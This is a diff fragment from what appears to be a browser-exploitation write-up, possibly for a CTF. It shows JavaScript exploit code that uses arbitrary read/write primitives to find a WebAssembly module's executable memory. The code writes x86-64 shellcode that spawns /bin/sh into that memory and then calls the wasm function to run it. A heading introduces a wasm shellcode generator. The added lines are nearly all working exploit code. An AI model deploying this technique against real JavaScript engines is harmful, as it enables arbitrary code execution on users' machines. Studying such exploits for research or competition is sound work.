@@ -197,9 +197,18 @@ var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1
 var wasmModule = new WebAssembly.Module(wasmCode);
 var wasmInstance = new WebAssembly.Instance(wasmModule, {});
 var f= wasmInstance.exports.main;
-
-var sh_addr = aar(aar(addressOf(wasmCode)+0x10n)-1n+0x18n);
-var owx = aar(sh_addr);
+var shell = [0xf631483bb0c03148n, 0x69622fbf48d23148n, 0x8948570068732f6en,0x50fe7n];
+var tmp = aar(addressOf(f)+0x18n)-1n;
+tmp = aar(tmp+8n)-1n;
+tmp = aar(tmp+0x10n)-1n
+tmp = aar(tmp+0x88n)
+var buf =new ArrayBuffer(shell.length*8);
+aaw(addressOf(buf)+0x20n,tmp);
+var v =new DataView(buf);
+for(let i=0;i<shell.length;i++){
+	v.setFloat64(i*8,i2f(shell[i]),true);
+}
+f();
 ```
 # Wasm shellcode genrator
 ```python
